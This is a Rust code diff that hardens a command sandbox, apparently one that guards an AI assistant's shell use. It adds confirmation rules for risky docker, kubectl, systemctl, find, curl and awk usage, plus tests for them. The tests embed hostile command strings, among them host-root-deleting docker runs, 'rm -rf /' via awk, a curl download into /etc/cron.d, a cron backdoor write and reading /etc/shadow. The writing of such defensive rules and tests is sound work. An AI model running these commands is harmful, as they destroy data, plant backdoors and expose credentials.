@@ -171,17 +171,84 @@ const STANDARD_WHITELIST: &[&str] = &[
     "nproc",
 ];
 
-/// 标准沙箱中需要确认的命令子命令（docker rm 等）
+/// 标准沙箱中需要确认的命令子命令（docker rm 等）。
+///
+/// 注意：白名单以命令名为粒度，但许多命令的部分子命令可派生任意执行或造成
+/// 破坏（`docker run` 可挂载宿主根目录、`kubectl exec` 可进容器执行、
+/// `systemctl stop` 可停服务）。这些子命令必须强制确认，不能因命令名在白名单
+/// 就直接放行。
 const STANDARD_CONFIRM_SUBCMDS: &[(&str, &str, RiskLevel)] = &[
+    // docker / podman：run/exec/create 可任意执行，其余为破坏性操作
+    ("docker", "run", RiskLevel::Critical),
+    ("docker", "exec", RiskLevel::Critical),
+    ("docker", "create", RiskLevel::High),
+    ("docker", "cp", RiskLevel::High),
+    ("docker", "build", RiskLevel::High),
+    ("docker", "load", RiskLevel::High),
+    ("docker", "commit", RiskLevel::High),
     ("docker", "rm", RiskLevel::High),
     ("docker", "stop", RiskLevel::High),
     ("docker", "kill", RiskLevel::High),
     ("docker", "rmi", RiskLevel::High),
     ("docker", "prune", RiskLevel::High),
+    ("podman", "run", RiskLevel::Critical),
+    ("podman", "exec", RiskLevel::Critical),
+    ("podman", "create", RiskLevel::High),
+    ("podman", "cp", RiskLevel::High),
+    ("podman", "rm", RiskLevel::High),
+    ("podman", "kill", RiskLevel::High),
+    // kubectl：exec/cp 可任意执行，apply/patch/replace/edit/scale 可变更集群
+    ("kubectl", "exec", RiskLevel::Critical),
+    ("kubectl", "cp", RiskLevel::Critical),
+    ("kubectl", "apply", RiskLevel::Critical),
+    ("kubectl", "replace", RiskLevel::Critical),
+    ("kubectl", "patch", RiskLevel::High),
+    ("kubectl", "edit", RiskLevel::High),
+    ("kubectl", "scale", RiskLevel::High),
     ("kubectl", "delete", RiskLevel::Critical),
     ("kubectl", "drain", RiskLevel::Critical),
     ("kubectl", "cordon", RiskLevel::High),
+    // helm：安装/升级/回滚/卸载均变更集群状态
+    ("helm", "install", RiskLevel::High),
+    ("helm", "upgrade", RiskLevel::High),
+    ("helm", "rollback", RiskLevel::High),
+    ("helm", "uninstall", RiskLevel::High),
+    ("helm", "delete", RiskLevel::High),
+    // systemctl / service：变更服务状态
+    ("systemctl", "start", RiskLevel::High),
+    ("systemctl", "stop", RiskLevel::High),
+    ("systemctl", "restart", RiskLevel::High),
+    ("systemctl", "reload", RiskLevel::High),
+    ("systemctl", "disable", RiskLevel::High),
+    ("systemctl", "enable", RiskLevel::High),
+    ("systemctl", "mask", RiskLevel::High),
+    ("systemctl", "kill", RiskLevel::High),
+    ("systemctl", "isolate", RiskLevel::Critical),
 ];
+
+/// 白名单命令携带下列参数时可派生任意执行/写文件，须强制确认。
+/// 元组：(命令名, 危险参数前缀, 说明, 风险级别)。
+/// 参数按前缀匹配（覆盖 `-o file` 与 `-ofile`、`--output=file` 等写法）。
+const STANDARD_DANGEROUS_ARGS: &[(&str, &str, &str, RiskLevel)] = &[
+    // find 可借 -exec/-execdir/-delete/-fprintf 执行命令或删文件
+    ("find", "-exec", "find -exec 可执行任意命令", RiskLevel::Critical),
+    ("find", "-execdir", "find -execdir 可执行任意命令", RiskLevel::Critical),
+    ("find", "-ok", "find -ok 可执行任意命令", RiskLevel::Critical),
+    ("find", "-delete", "find -delete 会删除文件", RiskLevel::High),
+    ("find", "-fprint", "find -fprint* 会写文件", RiskLevel::High),
+    // curl / wget 写文件可落地后门（cron、authorized_keys）
+    ("curl", "-o", "curl 写文件", RiskLevel::High),
+    ("curl", "-O", "curl 写文件", RiskLevel::High),
+    ("curl", "--output", "curl 写文件", RiskLevel::High),
+    ("curl", "--remote-name", "curl 写文件", RiskLevel::High),
+    ("wget", "-O", "wget 写文件", RiskLevel::High),
+    ("wget", "--output-document", "wget 写文件", RiskLevel::High),
+    ("wget", "-P", "wget 写文件", RiskLevel::High),
+];
+
+/// 这些白名单命令的首个「脚本参数」本身即可执行任意代码（awk/sed 程序、
+/// perl/python 的 -e 等），标准沙箱下一律要求确认。
+const STANDARD_SCRIPT_INTERPRETERS: &[&str] = &["awk", "gawk", "mawk", "sed"];
 
 // ── 判定引擎 ──────────────────────────────────────────────────────────────────
 
@@ -250,17 +317,50 @@ impl Sandbox {
         cmd: &crate::modules::ai::command_parser::ParsedCommand,
     ) -> Option<SandboxVerdict> {
         let name = cmd.name.as_str();
+
+        // 子命令通常是第一个非选项参数（跳过 `docker --context x run` 这类全局选项）。
+        let subcommand = cmd
+            .args
+            .iter()
+            .find(|a| !a.starts_with('-'))
+            .map(|a| a.as_str());
+
+        // 1. 危险子命令（docker run / kubectl exec / systemctl stop 等）。
         for (base, sub, level) in STANDARD_CONFIRM_SUBCMDS {
-            if name == *base {
-                if cmd.args.first().map(|a| a.as_str()) == Some(sub) {
-                    return Some(SandboxVerdict::NeedConfirm {
-                        reason: format!("`{} {}` 是破坏性操作，需要确认", base, sub),
-                        risk_level: *level,
-                        matched_command: cmd.raw.clone(),
-                    });
-                }
+            if name == *base && subcommand == Some(*sub) {
+                return Some(SandboxVerdict::NeedConfirm {
+                    reason: format!("`{} {}` 可能造成变更或任意执行，需要确认", base, sub),
+                    risk_level: *level,
+                    matched_command: cmd.raw.clone(),
+                });
             }
         }
+
+        // 2. 危险参数（find -exec / curl -o 等）。
+        for (base, flag, desc, level) in STANDARD_DANGEROUS_ARGS {
+            if name == *base
+                && cmd.args.iter().any(|a| a == flag || a.starts_with(&format!("{}=", flag)))
+            {
+                return Some(SandboxVerdict::NeedConfirm {
+                    reason: format!("{}，需要确认", desc),
+                    risk_level: *level,
+                    matched_command: cmd.raw.clone(),
+                });
+            }
+        }
+
+        // 3. 脚本解释器（awk/sed 程序可内嵌任意执行）。只要带了非选项参数
+        //    （即脚本体），就要求确认。
+        if STANDARD_SCRIPT_INTERPRETERS.contains(&name)
+            && cmd.args.iter().any(|a| !a.starts_with('-'))
+        {
+            return Some(SandboxVerdict::NeedConfirm {
+                reason: format!("`{}` 脚本可内嵌任意命令执行，需要确认", name),
+                risk_level: RiskLevel::High,
+                matched_command: cmd.raw.clone(),
+            });
+        }
+
         None
     }
 }
@@ -344,6 +444,114 @@ mod tests {
         assert!(matches!(
             sb.check("ls $(cat /etc/shadow)"),
             SandboxVerdict::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn test_docker_run_needs_confirm() {
+        let sb = Sandbox::new(SandboxMode::Standard);
+        // docker 在白名单，但 run/exec 可挂载宿主根目录或进容器执行任意命令
+        assert!(matches!(
+            sb.check("docker run -v /:/host alpine sh -c 'rm -rf /host'"),
+            SandboxVerdict::NeedConfirm {
+                risk_level: RiskLevel::Critical,
+                ..
+            }
+        ));
+        assert!(matches!(
+            sb.check("docker exec -it web bash"),
+            SandboxVerdict::NeedConfirm { .. }
+        ));
+        // docker ps 仍应放行
+        assert!(matches!(sb.check("docker ps -a"), SandboxVerdict::Allow));
+    }
+
+    #[test]
+    fn test_kubectl_apply_and_exec_need_confirm() {
+        let sb = Sandbox::new(SandboxMode::Standard);
+        assert!(matches!(
+            sb.check("kubectl exec pod -- sh -c whoami"),
+            SandboxVerdict::NeedConfirm { .. }
+        ));
+        assert!(matches!(
+            sb.check("kubectl apply -f evil.yaml"),
+            SandboxVerdict::NeedConfirm { .. }
+        ));
+        assert!(matches!(sb.check("kubectl get pods"), SandboxVerdict::Allow));
+    }
+
+    #[test]
+    fn test_find_exec_needs_confirm() {
+        let sb = Sandbox::new(SandboxMode::Standard);
+        assert!(matches!(
+            sb.check("find / -name x -exec rm -rf {} ;"),
+            SandboxVerdict::NeedConfirm { .. }
+        ));
+        assert!(matches!(
+            sb.check("find /tmp -delete"),
+            SandboxVerdict::NeedConfirm { .. }
+        ));
+        // 普通 find 查询仍放行
+        assert!(matches!(
+            sb.check("find /var/log -name '*.log'"),
+            SandboxVerdict::Allow
+        ));
+    }
+
+    #[test]
+    fn test_awk_script_needs_confirm() {
+        let sb = Sandbox::new(SandboxMode::Standard);
+        assert!(matches!(
+            sb.check("awk 'BEGIN{system(\"rm -rf /\")}'"),
+            SandboxVerdict::NeedConfirm { .. }
+        ));
+    }
+
+    #[test]
+    fn test_systemctl_stop_needs_confirm() {
+        let sb = Sandbox::new(SandboxMode::Standard);
+        assert!(matches!(
+            sb.check("systemctl stop nginx"),
+            SandboxVerdict::NeedConfirm { .. }
+        ));
+        assert!(matches!(
+            sb.check("systemctl status nginx"),
+            SandboxVerdict::Allow
+        ));
+    }
+
+    #[test]
+    fn test_curl_output_needs_confirm() {
+        let sb = Sandbox::new(SandboxMode::Standard);
+        assert!(matches!(
+            sb.check("curl http://evil/x -o /etc/cron.d/x"),
+            SandboxVerdict::NeedConfirm { .. }
+        ));
+        // 只读取不落地仍放行
+        assert!(matches!(
+            sb.check("curl -s http://example.com"),
+            SandboxVerdict::Allow
+        ));
+    }
+
+    #[test]
+    fn test_redirect_write_needs_confirm() {
+        let sb = Sandbox::new(SandboxMode::Standard);
+        // echo 在白名单，但重定向目标 `/etc/cron.d/x` 会被拆成独立段，
+        // 非白名单命令 → 需确认，堵住写后门文件
+        assert!(matches!(
+            sb.check("echo '* * * * root sh' > /etc/cron.d/x"),
+            SandboxVerdict::NeedConfirm { .. }
+        ));
+    }
+
+    #[test]
+    fn test_background_bypass_needs_confirm() {
+        let sb = Sandbox::new(SandboxMode::Standard);
+        // 单 `&` 后台符现在会拆分，rm 段落触发确认
+        assert!(matches!(
+            sb.check("ls & rm -rf /tmp"),
+            SandboxVerdict::NeedConfirm { .. }
         ));
     }
 }
